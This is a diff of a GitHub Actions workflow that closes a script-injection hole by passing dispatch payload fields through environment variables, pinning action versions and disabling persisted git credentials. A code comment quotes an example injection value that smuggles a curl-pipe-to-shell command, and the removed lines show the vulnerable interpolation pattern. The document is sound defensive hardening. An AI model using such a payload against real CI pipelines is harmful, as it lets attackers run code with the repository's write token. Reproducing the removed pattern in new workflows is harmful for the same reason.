@@ -15,24 +15,46 @@ permissions:
   issues: write # flags + the batch-issue record + the fresh Andon break
 concurrency:
   group: reconcile-${{ github.event.client_payload.workload }}
+# Every caller-controlled field reaches the step as an ENVIRONMENT VARIABLE and is
+# read back as a quoted shell variable — never as `${{ }}` inside `run:` (GHI #130).
+# Actions substitutes an expression into the run script BEFORE bash parses it, so an
+# interpolated payload field is not an argument, it is SOURCE TEXT: a dispatch
+# carrying `x; curl -s https://…/x.sh | sh; #` in `workload` executed that command
+# in this job, which holds `contents: write` + `issues: write` and the GITHUB_TOKEN.
+# Quoting the interpolation is not a defence either — the payload can close the
+# quote. An env var is data at every stage: Actions sets it, bash expands "$RC_…"
+# to exactly one argument, and no character in it is ever parsed as shell. Same
+# shape as workload-lifecycle.yml, which is where this repo already had it right.
+# The field NAMES are the dispatch contract (dashboard-github-api.md, PB-011) and
+# are unchanged; `--repo` now reads GITHUB_REPOSITORY, the runner's own default var.
+env:
+  RC_WORKLOAD: ${{ github.event.client_payload.workload }}
+  RC_PLAN_REF: ${{ github.event.client_payload.plan_ref }}
+  RC_STEPS: ${{ github.event.client_payload.contradicted_step_ids }}
+  RC_BATCH: ${{ github.event.client_payload.batch_issue }}
+  RC_ACTOR: ${{ github.event.client_payload.actor }}
 jobs:
   reconcile:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          # No git credentials in .git/config: every write here goes through
+          # octokit + GITHUB_TOKEN, never `git push` (zizmor artipacked).
+          persist-credentials: false
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
         with:
           node-version: 20
       - run: npm ci
       - name: propagate contradiction (closure flags + re-open — FR-022)
         run: >-
           npx tsx scripts/reconcile.ts
-          --workload ${{ github.event.client_payload.workload }}
-          --plan-ref ${{ github.event.client_payload.plan_ref }}
-          --steps "${{ github.event.client_payload.contradicted_step_ids }}"
-          --batch ${{ github.event.client_payload.batch_issue }}
-          --actor ${{ github.event.client_payload.actor }}
-          --repo ${{ github.repository }}
+          --workload "$RC_WORKLOAD"
+          --plan-ref "$RC_PLAN_REF"
+          --steps "$RC_STEPS"
+          --batch "$RC_BATCH"
+          --actor "$RC_ACTOR"
+          --repo "$GITHUB_REPOSITORY"
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
